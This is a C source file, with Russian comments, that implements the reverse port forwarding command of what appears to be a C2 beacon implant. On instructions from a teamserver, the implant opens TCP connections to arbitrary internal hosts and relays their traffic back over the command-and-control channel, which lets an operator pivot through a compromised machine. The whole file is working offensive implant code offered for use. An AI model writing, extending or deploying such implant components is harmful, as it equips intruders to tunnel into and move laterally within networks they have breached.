// cmd_rportfwd.c — обратный проброс порта через C2-канал (Reverse Port Forward).
// Linux-порт beacon/commands/cmd_rportfwd.c (WinSock → POSIX).
//
// Архитектура:
//   Teamserver открывает TCP-порт (lport). Когда клиент подключается к нему,
//   сервер генерирует conn_id и задаёт бикону команду OP_RPORTFWD_OPEN.
//   Бикон подключается к rhost:rport и сигнализирует об успехе/ошибке через
//   RPORTFWD_TASK_MAGIC. Данные в обе стороны передаются как:
//       server → beacon: OP_RPORTFWD_DATA задачи
//       beacon → server: RPORTFWD_TASK_MAGIC out-of-band кадры
//
// Формат RPORTFWD_TASK_MAGIC кадров:
//   [u64 conn_id BE][u8 type][optional payload]
//   0x01 = CONNECT_OK
//   0x02 = CONNECT_FAIL
//   0x03 = DATA: [u32 len BE][bytes]
//   0x04 = CLOSE

#include "../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <poll.h>

// ---- константы -----------------------------------------------------------

#define MAX_RPORTFWD_CONNS 16
#define RPORTFWD_BUF_SIZE  32768

#define RMSG_CONNECT_OK   0x01
#define RMSG_CONNECT_FAIL 0x02
#define RMSG_DATA         0x03
#define RMSG_CLOSE        0x04

// ---- таблица активных соединений -----------------------------------------

typedef struct {
    volatile int active;
    uint64_t     conn_id;
    int          sock;
} RpfConn;

static RpfConn     g_rpf[MAX_RPORTFWD_CONNS];
static volatile int g_rpf_inited = 0;

// ---- инициализация -------------------------------------------------------

static void rpf_init(void) {
    if (__atomic_load_n(&g_rpf_inited, __ATOMIC_SEQ_CST)) return;
    if (__atomic_exchange_n(&g_rpf_inited, 1, __ATOMIC_SEQ_CST) == 0) {
        for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
            g_rpf[i].active  = 0;
            g_rpf[i].conn_id = 0;
            g_rpf[i].sock    = -1;
        }
    }
}

// ---- вспомогательные функции ---------------------------------------------

static int rpf_find(uint64_t conn_id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++)
        if (__atomic_load_n(&g_rpf[i].active, __ATOMIC_SEQ_CST) &&
            g_rpf[i].conn_id == conn_id) return i;
    return -1;
}

static int rpf_alloc(uint64_t conn_id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        int expected = 0;
        if (__atomic_compare_exchange_n(&g_rpf[i].active, &expected, 1,
                0, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
            g_rpf[i].conn_id = conn_id;
            g_rpf[i].sock    = -1;
            return i;
        }
    }
    return -1;
}

static void rpf_free(int slot) {
    if (g_rpf[slot].sock >= 0) {
        close(g_rpf[slot].sock);
        g_rpf[slot].sock = -1;
    }
    g_rpf[slot].conn_id = 0;
    __atomic_store_n(&g_rpf[slot].active, 0, __ATOMIC_SEQ_CST);
}

// Целое в строку (для getaddrinfo port).
static void rpf_u32_str(uint32_t v, char* out) {
    char tmp[12]; int n = 0;
    if (!v) { out[0] = '0'; out[1] = '\0'; return; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0;
    while (n) out[i++] = tmp[--n];
    out[i] = '\0';
}

// Отправка RPORTFWD out-of-band сообщения через transport_direct_send.
static void rpf_send(const TransportVtbl* tv, uint64_t conn_id,
                     uint8_t type, const uint8_t* data, uint32_t dlen) {
    uint32_t extra = (type == RMSG_DATA && data && dlen) ? (4u + dlen) : 0u;
    uint32_t total = 9u + extra;   // 8(conn_id) + 1(type) + extra
    uint8_t* buf   = (uint8_t*)bmalloc(total);
    if (!buf) return;

    buf[0] = (uint8_t)(conn_id >> 56); buf[1] = (uint8_t)(conn_id >> 48);
    buf[2] = (uint8_t)(conn_id >> 40); buf[3] = (uint8_t)(conn_id >> 32);
    buf[4] = (uint8_t)(conn_id >> 24); buf[5] = (uint8_t)(conn_id >> 16);
    buf[6] = (uint8_t)(conn_id >>  8); buf[7] = (uint8_t)(conn_id);
    buf[8] = type;
    if (extra) {
        buf[9]  = (uint8_t)(dlen >> 24);
        buf[10] = (uint8_t)(dlen >> 16);
        buf[11] = (uint8_t)(dlen >>  8);
        buf[12] = (uint8_t)(dlen);
        memcpy(buf + 13, data, dlen);
    }
    transport_direct_send(tv, RPORTFWD_TASK_MAGIC, buf, total);
    bfree(buf);
}

// ---- Обработчики команд --------------------------------------------------

// OP_RPORTFWD_OPEN: подключиться к rhost:rport.
void cmd_rportfwd_open(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    char     rhost[256] = {0};
    uint32_t rport = 0;

    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);
    kv_get_str(t->pay, t->pay_len, "rhost",   rhost, sizeof(rhost));
    kv_get_u32(t->pay, t->pay_len, "rport",   &rport);

    if (!rhost[0] || !rport) {
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    int slot = rpf_alloc(conn_id);
    if (slot < 0) {
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    // Резолвинг и подключение к rhost:rport.
    char portstr[8] = {0};
    rpf_u32_str(rport, portstr);

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family   = AF_UNSPEC;

    if (getaddrinfo(rhost, portstr, &hints, &res) != 0 || !res) {
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    int s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) {
        freeaddrinfo(res);
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }
    sock_nosigpipe(s); // macOS: SO_NOSIGPIPE вместо MSG_NOSIGNAL

    // Неблокирующий connect с таймаутом 10 с через poll().
    int flags = fcntl(s, F_GETFL, 0);
    if (flags >= 0) fcntl(s, F_SETFL, flags | O_NONBLOCK);

    int cr = connect(s, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);

    if (cr < 0 && errno != EINPROGRESS) {
        close(s);
        rpf_free(slot);
        rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    if (cr < 0) {
        // Ожидание завершения connect.
        struct pollfd pfd = { .fd = s, .events = POLLOUT };
        int pr = poll(&pfd, 1, 10000);
        if (pr <= 0 || !(pfd.revents & POLLOUT)) {
            close(s);
            rpf_free(slot);
            rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
            return;
        }
        // Проверка ошибки соединения.
        int so_err = 0;
        socklen_t elen = sizeof(so_err);
        getsockopt(s, SOL_SOCKET, SO_ERROR, &so_err, &elen);
        if (so_err) {
            close(s);
            rpf_free(slot);
            rpf_send(tv, conn_id, RMSG_CONNECT_FAIL, NULL, 0);
            return;
        }
    }

    // Возвращаем в блокирующий режим.
    if (flags >= 0) fcntl(s, F_SETFL, flags);

    g_rpf[slot].sock = s;
    rpf_send(tv, conn_id, RMSG_CONNECT_OK, NULL, 0);
}

// OP_RPORTFWD_DATA: переслать данные в сокет.
void cmd_rportfwd_data(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);

    const uint8_t* data = NULL;
    uint32_t       dlen = 0;
    kv_find(t->pay, t->pay_len, "data", &data, &dlen);

    int slot = rpf_find(conn_id);
    if (slot < 0) {
        rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
        return;
    }

    if (data && dlen) {
        ssize_t sent = send(g_rpf[slot].sock, data, dlen, MSG_NOSIGNAL);
        if (sent <= 0) {
            rpf_free(slot);
            rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
            return;
        }
    }

    // Читаем немедленный ответ от целевого сервера, если есть данные.
    int avail = 0;
    if (ioctl(g_rpf[slot].sock, FIONREAD, &avail) == 0 && avail > 0) {
        uint32_t cap = (uint32_t)avail > RPORTFWD_BUF_SIZE
                     ? RPORTFWD_BUF_SIZE : (uint32_t)avail;
        uint8_t* rbuf = (uint8_t*)bmalloc(cap);
        if (rbuf) {
            ssize_t n = recv(g_rpf[slot].sock, rbuf, cap, 0);
            if (n > 0) {
                rpf_send(tv, conn_id, RMSG_DATA, rbuf, (uint32_t)n);
            } else {
                bfree(rbuf);
                rpf_free(slot);
                rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
                return;
            }
            bfree(rbuf);
        }
    }
}

// OP_RPORTFWD_CLOSE: закрыть соединение.
void cmd_rportfwd_close(const BeaconTask* t) {
    rpf_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);

    int slot = rpf_find(conn_id);
    if (slot >= 0) {
        rpf_free(slot);
    }
    rpf_send(tv, conn_id, RMSG_CLOSE, NULL, 0);
}

// ---- rportfwd_flush_pending (вызывается из main loop) --------------------
// Опрашивает все активные rportfwd-соединения и отправляет накопившиеся
// данные от целевого сервера обратно на teamserver.
void rportfwd_flush_pending(const TransportVtbl* tv) {
    if (!__atomic_load_n(&g_rpf_inited, __ATOMIC_SEQ_CST)) return;

    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (!__atomic_load_n(&g_rpf[i].active, __ATOMIC_SEQ_CST)) continue;
        int s = g_rpf[i].sock;
        if (s < 0) continue;

        int avail = 0;
        if (ioctl(s, FIONREAD, &avail) != 0 || avail <= 0) continue;

        uint32_t cap = (uint32_t)avail > RPORTFWD_BUF_SIZE
                     ? RPORTFWD_BUF_SIZE : (uint32_t)avail;
        uint8_t* rbuf = (uint8_t*)bmalloc(cap);
        if (!rbuf) continue;

        ssize_t n = recv(s, rbuf, cap, 0);
        if (n > 0) {
            rpf_send(tv, g_rpf[i].conn_id, RMSG_DATA, rbuf, (uint32_t)n);
        } else {
            // Сокет закрыт удалённой стороной.
            bfree(rbuf);
            uint64_t cid = g_rpf[i].conn_id;
            rpf_free(i);
            rpf_send(tv, cid, RMSG_CLOSE, NULL, 0);
            continue;
        }
        bfree(rbuf);
    }
}
